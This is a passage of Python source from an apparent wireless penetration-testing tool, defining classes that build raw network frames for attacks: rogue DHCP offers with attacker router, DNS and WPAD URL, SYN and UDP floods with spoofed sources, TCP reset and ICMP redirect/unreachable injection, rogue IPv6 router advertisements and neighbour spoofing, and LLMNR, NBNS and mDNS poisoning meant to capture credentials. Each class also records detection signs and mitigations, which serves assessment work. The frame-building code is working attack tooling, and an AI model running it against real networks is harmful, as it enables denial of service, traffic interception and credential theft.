    detection = ("NAK messages from a source that is not the server: a snooping switch drops "
                 "them when it is configured"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            victim = ns.dhcp_flood_mac(base + index, pattern=3)
            address = f"{prefix}.{(base + index) % 200 + 30}"
            out.append(_dhcp_wireless_frame(
                ap, victim, dhcp_nak(victim, f"{prefix}.1", requested_ip=address,
                                     message="address not available"),
                destination_ip="255.255.255.255", sport=DHCP_SERVER_PORT,
                dport=DHCP_CLIENT_PORT, to_ds=False, source_mac=ap.bssid))
        return out


class DhcpOptionInjectionAttack(_NetFlood):
    """Rogue DHCP options: the route, the resolver and the proxy, by option number.

    A DHCP reply carries more than an address.  Option 3 says which gateway to use,
    option 6 which resolver, option 121 a list of static routes, option 252 where to
    fetch the proxy configuration — and a client that receives them uses them, because
    that is what the protocol is for.  Every one of them is a redirection an attacker
    chooses.
    """

    name = "dhcp_option_injection"
    label = "Rogue DHCP option injection (route, DNS, WPAD)"
    tool = "wifipilot netproto.py (options 3, 6, 121, 249, 252)"
    description = ("Answer DHCP with OFFERs that carry the options a client acts on: "
                   "ourselves as the router and the resolver, a classless static route "
                   "that sends a chosen prefix through us, and a WPAD URL that makes the "
                   "client fetch its proxy configuration from a host we control.  The "
                   "address handed out is the least interesting part of the reply.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 8
    demo_rate = 300
    warning = ("clients that accept these leases will send their traffic through the "
               "address in the reply: that is the test, and it is visible")
    finding_title = "DHCP options can redirect a client's traffic"
    finding_detail = ("OFFERs carrying a rogue router, a rogue resolver, a classless "
                      "static route and a WPAD URL were bridged to the segment.  A client "
                      "that accepts one routes through the attacker, resolves through the "
                      "attacker, and fetches its proxy configuration from the attacker — "
                      "all with the protocol's own messages, all unauthenticated, and all "
                      "prevented by DHCP snooping with a trusted port list.")
    deliverable = "the finding (which options does the client act on, and how fast?)"

    detection = ("a second DHCP server answering with its own router and resolver options: two "
                 "OFFERs for one DISCOVER"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        rogue = getattr(ctx.config, "dns_sink_ip", "") or f"{_pool_prefix(ctx)}.66"
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            victim = ns.dhcp_flood_mac(base + index, pattern=1)
            offer = dhcp_rogue_offer(victim, f"{prefix}.{200 + index % 40}", rogue,
                                     dns=[rogue], lease=86400,
                                     wpad=f"http://{rogue}/wpad.dat",
                                     routes=f"10.0.0.0/8:{rogue};{prefix}.0/24:{rogue}")
            out.append(_dhcp_wireless_frame(ap, victim, offer,
                                            source_ip=rogue, sport=DHCP_SERVER_PORT,
                                            dport=DHCP_CLIENT_PORT, to_ds=False,
                                            source_mac=ap.bssid))
            # ... and the ACK, because a client only commits on the acknowledgement
            ack = dhcp_rogue_offer(victim, f"{prefix}.{200 + index % 40}", rogue,
                                   dns=[rogue], lease=86400, xid=index,
                                   wpad=f"http://{rogue}/wpad.dat",
                                   routes=f"10.0.0.0/8:{rogue}")
            out.append(_dhcp_wireless_frame(ap, victim, ack, source_ip=rogue,
                                            sport=DHCP_SERVER_PORT,
                                            dport=DHCP_CLIENT_PORT, to_ds=False,
                                            source_mac=ap.bssid))
        return out


class SynFloodAttack(_NetFlood):
    """SYN flood: half-open connections until the backlog is full.

    Every SYN makes the target allocate a transmission control block and put it in a
    queue that waits for a handshake that will never finish, because the source address
    is not there.  When the queue is full the target stops answering *real* clients — and
    the cost of filling it is one packet per connection.
    """

    name = "syn_flood"
    label = "TCP SYN flood (connection-table exhaustion)"
    tool = "wifipilot netstack.py (TCP headers, spoofed sources)"
    description = ("Send TCP SYNs with spoofed source addresses at the router and its "
                   "open services.  Each one is a connection the target half-opens and "
                   "then waits on: SYN cookies and a bounded backlog are the defences, and "
                   "the finding is whether either is configured.")
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    frames_per_round = 60
    demo_rate = 5000
    warning = "a SYN flood fills the target's connection table while it runs"
    finding_title = "TCP connection table can be filled from the wireless side"
    finding_detail = ("SYNs from source addresses that do not exist were bridged to the "
                      "target, which half-opened a connection for each.  The defences are "
                      "SYN cookies on the target and a rate limit on the path; without "
                      "them a wireless client can hold every connection slot the service "
                      "has, and the service is unavailable to the clients that pay for it.")
    deliverable = "the finding (how many SYNs before the service stops answering?)"

    detection = ("a burst of SYNs with source addresses that never complete a handshake: the "
                 "target's connection table fills and its logs show hundreds of half-open "
                 "sessions"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        target = getattr(ctx.config, "gateway_ip", "") or f"{_pool_prefix(ctx)}.1"
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            sequence = base + index
            source = f"10.66.{(sequence >> 8) % 250}.{(sequence % 250) + 2}"
            port = 1024 + (sequence % 60000)
            segment = ns.tcp_packet(source, target, port, 80 if index % 3 else 443,
                                    sequence=sequence * 7919,
                                    flags=ns.tcp_flags(syn=True), window=64240)
            ethernet = ns.ethernet_frame(BROADCAST_MAC,
                                         ns.dhcp_flood_mac(sequence, pattern=2),
                                         ns.ipv4_packet(source, target, 6, segment,
                                                        ttl=64,
                                                        identification=sequence & 0xFFFF),
                                         0x0800)
            out.append(self.net_frame(ap, self.station_for(sequence), ethernet))
        return out


class UdpFloodAttack(_NetFlood):
    """UDP flood: the router's slow path, and the ICMP it answers with.

    A router forwards packets in a fast path implemented in hardware and *answers* the
    ones it cannot: a datagram to a closed port on the router itself costs it an ICMP
    port-unreachable, which costs it CPU and a packet.  Point the flood at the router's
    own addresses and each datagram costs two packets and a software interrupt, which is
    the resource-exhaustion attack the brief named.
    """

    name = "udp_flood"
    label = "UDP flood / router resource exhaustion"
    tool = "wifipilot netstack.py (UDP to the router's own stack)"
    description = ("Send UDP datagrams at the highest rate the link allows to closed ports "
                   "on the router and to its broadcast address.  Each one makes the "
                   "router's own stack generate an ICMP port-unreachable, so the flood "
                   "spends the router's CPU on answers to traffic nobody wanted — the "
                   "classic router resource exhaustion.")
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    frames_per_round = 80
    demo_rate = 6000
    warning = ("the router's own stack is being flooded: its management interface will "
               "be slow while this runs")
    finding_title = "The router answers closed-port traffic at line rate"
    finding_detail = ("UDP datagrams to closed ports on the router were answered with ICMP "
                      "port-unreachable for as long as they were sent.  Every one costs "
                      "the router a packet build and a transmission, which is the cheapest "
                      "way to spend somebody else's CPU from a wireless client.  Rate "
                      "limiting ICMP and disabling directed broadcasts are the controls; "
                      "ICMP generation is not something a service can switch off per port.")
    deliverable = "the finding (how does the router behave under a datagram flood?)"

    detection = ("datagrams to closed ports at line rate, and an ICMP port-unreachable for "
                 "each: the router's own CPU is visibly busy"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        target = getattr(ctx.config, "gateway_ip", "") or f"{prefix}.1"
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            sequence = base + index
            source = f"10.66.{(sequence >> 8) % 250}.{(sequence % 250) + 2}"
            payload = os.urandom(96)
            destination = target if index % 3 else f"{prefix}.255"
            datagram = ns.udp_packet(source, destination, 40000 + (sequence % 20000),
                                     9 + (index % 7), payload)
            ethernet = ns.ethernet_frame(BROADCAST_MAC,
                                         ns.dhcp_flood_mac(sequence, pattern=1),
                                         ns.ipv4_packet(source, destination, 17, datagram,
                                                        ttl=64,
                                                        identification=sequence & 0xFFFF),
                                         0x0800)
            out.append(self.net_frame(ap, self.station_for(sequence), ethernet))
        return out


class TcpResetInjectionAttack(_NetFlood):
    """RST injection: end somebody else's connection with one packet.

    A TCP reset is accepted on the strength of the addresses, the ports and the sequence
    number.  On a wireless network those are all visible to anybody with a radio, so a
    connection that a client believes is private can be closed by a third party — and
    done repeatedly, every connection the client opens.
    """

    name = "tcp_reset_injection"
    label = "TCP reset injection"
    tool = "wifipilot netstack.py (RST with a guessed sequence)"
    description = ("Inject TCP RST segments into connections observed on the air, with "
                   "the ports and sequence numbers that a passive capture makes "
                   "available.  One accepted RST ends a session; a stream of them ends "
                   "every session the client opens.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 12
    demo_rate = 400
    warning = "RST injection closes connections that belong to other clients"
    finding_title = "TCP connections can be reset from the air"
    finding_detail = ("RST segments were accepted by the endpoints of connections that "
                      "were captured passively: the packet carried no authentication "
                      "beyond the four-tuple and a sequence number, both of which travel "
                      "in the clear.  TLS protects the contents of a connection, not its "
                      "existence.  The mitigation is encryption of the *link* (WPA3, PMF, "
                      "or a wired infrastructure where a rogue radio cannot join).")
    deliverable = "the finding (can a session on this network be closed by a stranger?)"

    detection = ("RST segments on connections whose endpoints did not send them, which ends "
                 "sessions and is obvious in a packet capture on either endpoint"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            local = f"{prefix}.{(base + index) % 200 + 20}"
            remote = "93.184.216.34"
            for direction in (0, 1):
                source, destination = ((remote, local) if direction else (local, remote))
                sport, dport = ((443, 40000 + index) if direction else (40000 + index, 443))
                segment = ns.tcp_packet(source, destination, sport, dport,
                                        sequence=(base + index) * 104729,
                                        acknowledgement=1, flags=ns.tcp_flags(rst=True,
                                                                              ack=True))
                ethernet = ns.ethernet_frame(BROADCAST_MAC,
                                             ns.dhcp_flood_mac(base + index,
                                                               pattern=3),
                                             ns.ipv4_packet(source, destination, 6,
                                                            segment, ttl=64,
                                                            identification=index & 0xFFFF),
                                             0x0800)
                out.append(self.net_frame(ap, self.station_for(base + index), ethernet))
        return out


class UdpReflectionAttack(_NetFlood):
    """Broadcast reflection: one datagram in, a segment's worth of answers out.

    SSDP, mDNS and NetBIOS all answer broadcast queries, and the answers go to the
    address in the query.  Spoof that address and the responses land on the victim — the
    service is the amplifier and the victim is the target.  The amplification factor of
    an SSDP search is an order of magnitude, which is why the query is worth measuring
    rather than assuming.
    """

    name = "udp_reflection"
    label = "UDP reflection (SSDP, mDNS, NetBIOS)"
    tool = "wifipilot netstack.py (broadcast queries with a spoofed source)"
    description = ("Send SSDP M-SEARCH, mDNS queries and NetBIOS name queries to their "
                   "multicast and broadcast addresses with a spoofed source address, so "
                   "that every device's answer is delivered to the victim.  The queries "
                   "are small and the answers are not.")
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    frames_per_round = 30
    demo_rate = 2000
    warning = ("the responses to these queries go to the spoofed source address: if that "
               "address belongs to a client, the client is being flooded")
    finding_title = "Broadcast services amplify a spoofed query"
    finding_detail = ("SSDP, mDNS and NetBIOS queries with a spoofed source were answered "
                      "by the devices on the segment, each response addressed to the "
                      "source in the query.  That is an amplifier: one wireless frame "
                      "produces answers from every device that speaks the protocol.  These "
                      "protocols are supposed to be confined to the local link, so the "
                      "control is on the router (no directed broadcasts, multicast "
                      "filtering per port) and on the devices (UPnP off unless needed).")
    deliverable = "the finding (which protocols answer a spoofed query?)"

    detection = ("broadcast queries whose source address is not the sender's, answered by "
                 "every device that speaks the protocol"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        victim = f"{prefix}.{(round_index * 13) % 200 + 20}"
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            station = self.station_for(base + index)
            kind = index % 3
            if kind == 0:
                payload = ssdp_msearch("ssdp:all")
                destination, dport = "239.255.255.250", 1900
            elif kind == 1:
                payload = ns.mdns_query("_services._dns-sd._udp.local")
                destination, dport = "224.0.0.251", 5353
            else:
                payload = ns.nbns_query("WORKGROUP")
                destination, dport = f"{prefix}.255", 137
            out.append(self.udp_to(ap, station, victim, destination,
                                   40000 + index, dport, payload))
        return out


class IcmpRedirectInjectionAttack(_NetFlood):
    """ICMP redirect: rewrite a host's routing table with one packet.

    A redirect says "for that destination, use this gateway instead".  Hosts are supposed
    to accept redirects only from the router they already trust and only for the local
    subnet — and plenty of stacks do not check either.  When one is accepted, the victim's
    traffic to a destination takes a path the attacker chose.
    """

    name = "icmp_redirect_injection"
    label = "ICMP redirect injection"
    tool = "wifipilot netstack.py (ICMP type 5)"
    description = ("Send ICMP redirects naming ourselves as the better gateway for a "
                   "destination the victim is talking to, addressed to the victim with the "
                   "gateway as the apparent source.  A host that accepts it sends that "
                   "traffic through us — the routing decision made from the air.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 10
    demo_rate = 300
    warning = "redirects change a client's routing: its traffic will follow the new path"
    finding_title = "ICMP redirects are accepted from the wireless side"
    finding_detail = ("ICMP redirects were sent to clients with the real gateway as the "
                      "apparent source, naming a different next hop.  A host that honours "
                      "one routes a destination through the attacker, and the host has no "
                      "way to tell the message from one its own router sent.  The control "
                      "is on the host (accept_redirects=0 on Linux, and the equivalent "
                      "settings on every other stack) because the message itself cannot be "
                      "authenticated.")
    deliverable = "the finding (is the stack willing to be told where to route?)"

    detection = ("ICMP redirects from the gateway naming a different next hop: a host that "
                 "logs them shows the redirection"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        gateway = getattr(ctx.config, "gateway_ip", "") or f"{prefix}.1"
        rogue = getattr(ctx.config, "dns_sink_ip", "") or f"{prefix}.66"
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            victim = f"{prefix}.{(base + index) % 200 + 20}"
            original = ns.ipv4_packet(victim, "93.184.216.34", 6,
                                      ns.tcp_packet(victim, "93.184.216.34", 40000, 443,
                                                    flags=ns.tcp_flags(ack=True)))[:28]
            redirect = ns.icmp_redirect(rogue, original=original)
            # the Ethernet source has to look like the router that is redirecting, so it
            # carries the access point's own address — the only layer-2 address on the
            # segment this radio can plausibly be
            ethernet = ns.ethernet_frame(ap.bssid, ap.bssid,
                                         ns.ipv4_packet(gateway, victim, 1, redirect,
                                                        ttl=64))
            out.append(self.net_frame(ap, self.station_for(base + index), ethernet,
                                      to_ds=False))
        return out


class IcmpUnreachableInjectionAttack(_NetFlood):
    """ICMP unreachable: kill a connection without touching either endpoint.

    A host that receives "administratively prohibited" or "host unreachable" for a
    destination stops trying: the route is withdrawn in the middle of a connection.  It
    is one packet per connection, it is indistinguishable from a firewall doing its job,
    and it is the cheapest way to make a service look broken.
    """

    name = "icmp_unreachable_injection"
    label = "ICMP unreachable injection"
    tool = "wifipilot netstack.py (ICMP type 3)"
    description = ("Send ICMP destination-unreachable messages quoting the victim's own "
                   "packets, with codes that read as a policy decision (administratively "
                   "prohibited) or a routing failure (host unreachable).  A stack that "
                   "believes one tears down the connection that was working.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 12
    demo_rate = 400
    warning = "unreachable messages make clients drop working connections"
    finding_title = "ICMP unreachable messages are honoured from the local segment"
    finding_detail = ("ICMP unreachable messages quoting the client's own packets were "
                      "sent with codes that a stack treats as authoritative.  Connections "
                      "that were working were torn down by a third party: ICMP has no "
                      "authentication, and a message that looks exactly like a router "
                      "withdrawing a route cannot be distinguished from one.")
    deliverable = "the finding (does the stack believe an unreachable from a stranger?)"

    detection = ("ICMP unreachable messages quoting traffic the victim sent — "
                 "indistinguishable from a router withdrawing a route unless the source "
                 "is checked")

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            victim = f"{prefix}.{(base + index) % 200 + 20}"
            remote = "93.184.216.34"
            original = ns.ipv4_packet(victim, remote, 6,
                                      ns.tcp_packet(victim, remote, 40000, 443,
                                                    sequence=1000,
                                                    flags=ns.tcp_flags(psh=True,
                                                                       ack=True)))
            code = 10 if index % 2 else 1
            unreachable = ns.icmp_unreachable(code, original=original)
            ethernet = ns.ethernet_frame(ap.bssid, ap.bssid,
                                         ns.ipv4_packet(remote, victim, 1, unreachable,
                                                        ttl=64))
            out.append(self.net_frame(ap, self.station_for(base + index), ethernet,
                                      to_ds=False))
        return out


class RogueRaAttack(_NetFlood):
    """A rogue IPv6 router: the default route is whoever speaks first.

    An IPv6 host does not need a DHCP server and does not ask for a router: it accepts
    router advertisements, and the first one it hears becomes its default route and its
    prefix.  Announce a prefix, an MTU and yourself as the resolver, and the hosts that
    hear you are on your network — with a real prefix, real DNS, and every connection
    visible.
    """

    name = "rogue_ra"
    label = "Rogue IPv6 router advertisement"
    tool = "wifipilot netstack.py (ICMPv6 RA with RDNSS)"
    description = ("Announce ourselves as an IPv6 router with a prefix, a lifetime and an "
                   "RDNSS option naming us as the resolver.  Hosts configure a global "
                   "address from the prefix, a default route through us and a DNS server "
                   "that is us, without a single packet of their own.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 6
    demo_rate = 200
    warning = ("a rogue router advertisement reconfigures IPv6 on the segment: hosts "
               "will take a default route through this radio")
    finding_title = "IPv6 hosts accept a rogue router advertisement"
    finding_detail = ("router advertisements naming this radio as the router and the "
                      "resolver were accepted by hosts on the segment, which configured "
                      "an address from the advertised prefix and a default route through "
                      "it.  The mitigations are RA Guard on the switches and the AP, "
                      "SEND (RFC 3971) where it is deployed at all, and disabling IPv6 "
                      "where it is not used — a stack that has IPv6 on and no control "
                      "plane for it is configured for exactly this.")
    deliverable = "the finding (does the segment have RA Guard?)"

    detection = ("router advertisements from an address that is not the site's router: RA "
                 "Guard on the switches drops them, and without it hosts accept them"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        router = f"fe80::{(round_index % 250) + 2}"
        prefix = f"2001:db8:bad:{round_index % 16}::"
        advertisement = ns.icmpv6_router_advertisement(router=router, prefix=prefix,
                                                       lifetime=1800, mtu=1500,
                                                       dns=[f"{prefix}53"])
        return [self.net_frame(ap, self.station_for(round_index),
                               ns.ethernet_frame("33:33:00:00:00:01", ap.bssid,
                                                 ns.ipv6_packet(router,
                                                                ns.IPV6_MULTICAST_ALL_NODES,
                                                                58, advertisement),
                                                 0x86DD),
                               to_ds=False)]


class RaFloodAttack(_NetFlood):
    """RA flood: many routers, many prefixes, and the real one pushed out.

    Every router advertisement replaces the host's default route and adds a prefix to its
    list.  Send them faster than the real router does, with lifetimes that reach far into
    the future, and the host's IPv6 configuration becomes a list of prefixes that do not
    exist — with the real route lost among them.
    """

    name = "ra_flood"
    label = "IPv6 router advertisement flood"
    tool = "wifipilot netstack.py (RA flood with prefix churn)"
    description = ("Send router advertisements from rotating link-local routers with a new "
                   "prefix each time, at a rate no real router uses, plus advertisements "
                   "that deprecate the prefixes already in use.  Hosts accumulate "
                   "addresses for networks that do not exist and lose the ones that do.")
    category = "dos"
    noise = "loud"
    impact = "outage"
    frames_per_round = 20
    demo_rate = 1200
    warning = ("IPv6 on the segment is being taken over while this runs: hosts lose "
               "their real default route")
    finding_title = "IPv6 router advertisements are accepted without RA Guard"
    finding_detail = ("router advertisements were sent at a rate no router uses, with "
                      "rotating source addresses and prefixes.  Hosts on the segment "
                      "processed them — a flood of them is a denial of IPv6 service, and "
                      "the reason RA Guard exists.  The equivalent damage on IPv4 requires "
                      "a DHCP server that answers faster than the site's own, which is "
                      "harder; on IPv6 it is one frame per advertisement.")
    deliverable = "the finding (is RA Guard configured on the wired side?)"

    detection = ("router advertisements at a rate no router uses, with rotating sources and "
                 "prefixes"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            router = f"fe80::{(base + index) % 60000 + 1000:x}"
            prefix = f"2001:db8:f{index % 16}:{(base + index) % 65536:x}::"
            if index % 5 == 0:
                # lifetime zero: deprecate every prefix a host configured from a flood
                advertisement = ns.icmpv6_router_advertisement(
                    router=router, prefix=prefix, lifetime=0, prefix_length=64,
                    valid_lifetime=0, dns=[])
            else:
                advertisement = ns.icmpv6_router_advertisement(
                    router=router, prefix=prefix, lifetime=65535, mtu=1280, dns=[])
            out.append(self.net_frame(
                ap, self.station_for(base + index),
                ns.ethernet_frame("33:33:00:00:00:01", ap.bssid,
                                  ns.ipv6_packet(router, ns.IPV6_MULTICAST_ALL_NODES, 58,
                                                 advertisement), 0x86DD),
                to_ds=False))
        return out


class NeighbourSpoofAttack(_NetFlood):
    """Neighbour spoofing: the IPv6 gateway's address, answered by us.

    IPv6 finds a neighbour with a solicitation and an advertisement, exactly as IPv4 uses
    ARP — and with the same lack of authentication.  Answer a solicitation for the
    gateway's address with our own MAC, and the neighbour cache of every host that asked
    points at this radio: the same man-in-the-middle as ARP spoofing, for the protocol
    that is supposed to replace it.
    """

    name = "ns_na_spoof"
    label = "IPv6 neighbour solicitation / advertisement spoofing"
    tool = "wifipilot netstack.py (NS and NA with override)"
    description = ("Send unsolicited neighbour advertisements, with the override flag set, "
                   "for the gateway's address — and answer neighbour solicitations for it "
                   "with our own MAC.  Hosts replace a cached mapping on the strength of "
                   "one advertisement, which is IPv6's ARP poisoning.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 8
    demo_rate = 300
    warning = ("the IPv6 gateway's address is being mapped to this radio: hosts on the "
               "segment will send through it")
    finding_title = "IPv6 neighbour discovery can be spoofed from the air"
    finding_detail = ("neighbour advertisements for the gateway's address were accepted, "
                      "with the override flag, by hosts on the segment.  Their traffic to "
                      "the IPv6 gateway now leaves through this radio.  Neighbour "
                      "Discovery has no more authentication than ARP does; the mitigations "
                      "are the same — RA Guard and ND inspection on the switches, and "
                      "802.1X so that a radio cannot join the segment at all.")
    deliverable = "the finding (is ND inspection configured?)"

    detection = ("neighbour advertisements for the gateway claiming a new MAC: ND inspection "
                 "drops them, and the gateway's own traffic counters stop matching"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = "2001:db8:bad"
        attacker_mac = ns.dhcp_flood_mac(round_index, pattern=1)
        gateway_v6 = f"{prefix}::1"
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            target = f"{prefix}::{100 + (round_index * self.frames_per_round + index) % 200}"
            if index % 2:
                advertisement = ns.icmpv6_neighbor_advertisement(
                    gateway_v6, target, source_mac=attacker_mac, router=True,
                    solicited=False, override=True)
                ethernet = ns.ethernet_frame("33:33:00:00:00:01", attacker_mac,
                                             ns.ipv6_packet(gateway_v6,
                                                            ns.IPV6_MULTICAST_ALL_NODES,
                                                            58, advertisement), 0x86DD)
            else:
                solicitation = ns.icmpv6_neighbor_solicitation(gateway_v6, target,
                                                               source_mac=attacker_mac)
                destination = ns.solicited_node_multicast(target)
                ethernet = ns.ethernet_frame(ns.ipv6_multicast_mac(destination),
                                             attacker_mac,
                                             ns.ipv6_packet(gateway_v6, destination, 58,
                                                            solicitation), 0x86DD)
            out.append(self.net_frame(ap, self.station_for(round_index), ethernet))
        return out


class LlmnrPoisonAttack(_NetFlood):
    """LLMNR poisoning: answer the name nobody else will.

    Windows hosts fall back to LLMNR when DNS does not answer — and the *first* response
    wins, because there is no second round.  Answer a query for a file server, a printer
    or a domain controller with our own address and the victim connects to us and, on many
    stacks, sends its credentials to prove who it is.
    """

    name = "llmnr_poisoning"
    label = "LLMNR poisoning"
    tool = "wifipilot netstack.py (LLMNR responses)"
    description = ("Listen for LLMNR queries and answer every one with our own address: "
                   "the query names a host the victim wants to reach, and the answer "
                   "redirects it.  The follow-up — NTLM over SMB to a server we control — "
                   "is how a credential is captured from a network attack.")
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    frames_per_round = 8
    demo_rate = 300
    warning = ("name resolution on the segment is being answered by us: victims will "
               "connect to this address for names they asked about")
    finding_title = "LLMNR answers are accepted from any host on the segment"
    finding_detail = ("LLMNR queries were answered from this radio and the answers were "
                      "accepted by the hosts that asked.  Any client on the network can "
                      "become the server for a name, and the victim proves who it is to "
                      "whatever answers — which is how NTLM credentials are captured "
                      "without cracking anything.  The control is to turn LLMNR off by "
                      "group policy where it is not needed, and to require SMB signing "
                      "where it is.")
    deliverable = "the captured name request, and the addresses the victims will connect to"

    detection = ("LLMNR answers from a host that is not the owner of the name; the victims' "
                 "next connection goes to the attacker"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        rogue = getattr(ctx.config, "dns_sink_ip", "") or f"{prefix}.66"
        names = ["fileserver", "dc01", "print01", "nas", "backup", "intranet",
                 "finance-srv", "hr-share"]
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            name = names[(base + index) % len(names)]
            query = ns.llmnr_query(name)
            answer = ns.llmnr_response(query, rogue, name=name)
            out.append(self.udp_to(ap, self.station_for(base + index), rogue,
                                   f"{prefix}.255", 5355, 5355, answer))
        return out


class NbnsPoisonAttack(_NetFlood):
    """NetBIOS name service poisoning: the same trick, for the oldest protocol there is.

    NetBIOS name service predates everything: hosts still ask for names by broadcast, and
    still accept the first answer.  The difference from LLMNR is the payload of what comes
    next — an SMB session to a server that claims the name, and on a network with SMBv1 or
    without signing, a challenge-response the attacker can take away and crack.
    """

    name = "nbns_poisoning"
    label = "NetBIOS name service poisoning"
    tool = "wifipilot netstack.py (NBNS responses)"
    description = ("Answer NetBIOS name queries with our own address.  The victim's next "
                   "step is a connection to the name — an SMB session, a file share, a "
                   "domain logon — and it arrives at a host we control, which is where the "
                   "credential is captured.")
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    frames_per_round = 8
    demo_rate = 300
    warning = ("NetBIOS names are being answered by us: victims will open SMB sessions "
               "to this address")
    finding_title = "NetBIOS name queries are answered from any host"
    finding_detail = ("NetBIOS name queries were answered from this radio and the answers "
                      "were accepted.  NetBIOS has no authentication of its own, so the "
                      "only control is not to use it: disable NetBIOS over TCP/IP, and "
                      "require SMB signing and a modern SMB version, which turns a "
                      "captured response into something that cannot be cracked offline.")
    deliverable = "the name requests, and the SMB sessions that follow"

    detection = ("NetBIOS name answers from an unexpected host, followed by SMB sessions to it"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        rogue = getattr(ctx.config, "dns_sink_ip", "") or f"{prefix}.66"
        names = ["FILESERVER", "DC01", "PRINT01", "NAS", "BACKUP", "WORKGROUP"]
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            name = names[(base + index) % len(names)]
            query = ns.nbns_query(name)
            answer = ns.nbns_response(query, rogue)
            out.append(self.udp_to(ap, self.station_for(base + index), rogue,
                                   f"{prefix}.255", 137, 137, answer))
        return out


class MdnsPoisonAttack(_NetFlood):
    """mDNS poisoning: be the printer, the speaker and the dashboard.

    mDNS is how a network's devices find each other by name without a server, and its
    answers are accepted from anybody.  Claim a device's name and the clients that use it
    follow the claim: a printer that receives a document, a dashboard that receives
    credentials, a speaker that receives audio.
    """

    name = "mdns_poisoning"
    label = "mDNS response poisoning"
    tool = "wifipilot netstack.py (mDNS responses)"
    description = ("Answer mDNS queries for device names on the segment — printers, "
                   "displays, control systems — with our own address.  mDNS has no "
                   "authentication and devices cache the first answer they hear, so the "
                   "name resolves to whoever answered.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 8
    demo_rate = 300
    warning = ("mDNS names are being answered by us: devices that use those names will "
               "connect to this address")
    finding_title = "mDNS names can be claimed from the segment"
    finding_detail = ("mDNS answers were sent for names other devices were resolving, and "
                      "were accepted.  mDNS is meant for a trusted local link and has no "
                      "authentication at all, so a name is owned by whoever answers "
                      "first — which is what makes a device's 'it is always printer.local' "
                      "assumption a redirection primitive.  The practical control is "
                      "pinning the addresses of infrastructure devices rather than "
                      "trusting their names.")
    deliverable = "the names claimed, and the clients that then connected to us"

    detection = ("mDNS answers for names that belong to other devices on the segment")

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        rogue = getattr(ctx.config, "dns_sink_ip", "") or f"{prefix}.66"
        names = ["printer.local", "display-01.local", "hvac.local", "camera-1.local",
                 "controller.local", "gateway.local"]
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            name = names[(base + index) % len(names)]
            answer = ns.mdns_response(name, rogue)
            out.append(self.udp_to(ap, self.station_for(base + index), rogue,
                                   "224.0.0.251", 5353, 5353, answer))
        return out


class StpRootTakeoverAttack(_NetFlood):
    """Spanning tree root takeover: the best bridge ID wins, and it can be ours.

    A switch that hears a superior BPDU — a lower bridge ID or a lower root path cost —
    stops forwarding on that port and starts listening to the new topology.  Send one and
    the spanning tree is rebuilt around this radio: traffic that used to take the wired
    path goes through the access point, and a second frame can make the tree unstable for
    as long as it is repeated.
    """

    name = "stp_root_takeover"
    label = "Spanning tree root bridge takeover"
    tool = "wifipilot netstack.py (802.1D configuration BPDUs)"
    description = ("Send configuration BPDUs with a root bridge ID that beats the real "
                   "root's, with hello, max-age and forward-delay timers that make the "
                   "tree converge on this radio.  The switches recompute the topology, "
                   "and a repeated stream keeps it recomputing.")
